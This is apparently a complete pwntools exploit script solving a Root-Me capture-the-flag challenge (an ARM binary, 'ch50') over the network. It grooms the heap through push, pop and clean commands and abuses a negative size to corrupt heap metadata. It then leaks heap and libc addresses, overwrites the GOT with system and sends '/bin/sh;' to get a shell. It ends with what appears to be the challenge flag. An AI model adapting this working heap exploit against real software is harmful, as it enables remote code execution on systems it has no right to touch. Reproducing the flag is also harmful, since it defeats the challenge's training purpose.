#!/usr/bin/python


# file code
# set architecture arm
# target remote 127.0.0.1:1234

# qemu-arm -L /usr/arm-linux-gnueabi/ -g 1234 ./ch50


from pwn import *
import binascii
import sys


if len(sys.argv) > 1:
    debug = True
else:
    debug = False


if debug:
    r = process(['qemu-arm',  '-L', '/usr/arm-linux-gnueabi/', '-g', '1234', 'ch50'])
else:
    r = remote('challenge04.root-me.org', 61050)


def push(size, to_push, r):
    r.sendline('push')
    print(r.recvuntil('Size:'))
    print("Sending size "+str(size))
    r.sendline(str(size))
    print(r.recvuntil('Data:'))
    r.send(to_push)
    tmp = r.recvuntil('>')
    print(tmp)
    return tmp

def pop(r):
    r.sendline('pop')
    tmp = r.recvuntil('>')
    print(tmp)
    return tmp

def clean(r):
    r.sendline('clean')
    tmp = r.recvuntil('>')
    print(tmp)
    return tmp

def quit(r):
    r.sendline('quit')
    tmp = r.recvall()
    print(tmp)
    return tmp


print(r.recvuntil('>'))

push(400, "A"*300, r)
push(17, "/bin/sh", r)
pop(r)
push(20, "g"*20, r)
push(17, "/bin/sh", r)
pop(r)
clean(r)
push(20, "h"*20, r)
push(17, "/bin/sh", r)
pop(r)
push(20, "i"*20, r)
clean(r)
push(500, "C"*400, r)
push(-1, "B"*194, r)
push(-0x700+14*0x10+8, "0"*38, r)
pop(r)
push(120, "2"*95+"\n", r)

leaked = pop(r).split('\n')[1]
try:
    heap = u32(leaked[4:8])
    libc = u32(leaked[:4])
except:
    try:
        heap = u32(leaked[4:]+'\x00')
    except:
        heap = 0
    libc = 0xf67b07f4
print("Heap address : "+hex(heap))
print("Libc address : "+hex(libc))

system_offset = -0xbc073
__free_hook_offset = 0xf14
system = libc+system_offset
__free_hook = libc+__free_hook_offset
GOT = 0x226b4
target_size = GOT-heap-0x1B0

push(-1, "C"*194, r)
push(target_size, "1"*38, r)
pop(r)
push(100, p32(system)*9, r)
pop(r)

r.send("/bin/sh;")
r.interactive()

quit(r)

#57r0nG_w1th_th1s_0n3_7h3_f0rC3_1S
